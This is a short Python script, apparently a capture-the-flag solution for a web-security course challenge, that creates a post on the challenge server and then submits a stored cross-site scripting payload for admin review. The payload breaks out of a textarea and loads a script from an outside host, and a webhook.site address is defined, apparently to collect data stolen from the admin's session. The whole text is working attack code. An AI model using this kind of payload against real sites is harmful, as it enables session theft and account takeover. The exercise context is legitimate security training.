import requests
import random
import string

SERVER = "http://ssof2526.challenges.cwte.me"
PORT = 25254

link = f"{SERVER}:{PORT}"
webhook = "https://webhook.site/901848de-a767-450a-98da-1e45d0b33a95"
s = requests.Session()

script_link = "https://web.tecnico.ulisboa.pt/ist1106794/script.js"

payload = f'</textarea><script src="{script_link}"></script>'

data = {"title": "".join(random.choices(string.ascii_letters, k = 8)), "content": "lol"}
post = s.post(link + "/submit_post_for_review", data = data).text 
part = post.split('value="')[1] # get the number after value to know post number
post_link = part.split('"')[0] # get the post number

data = {'link' : post_link, 'content' : payload }
s.post(f'{link}/submit_for_admin_review', data=data)
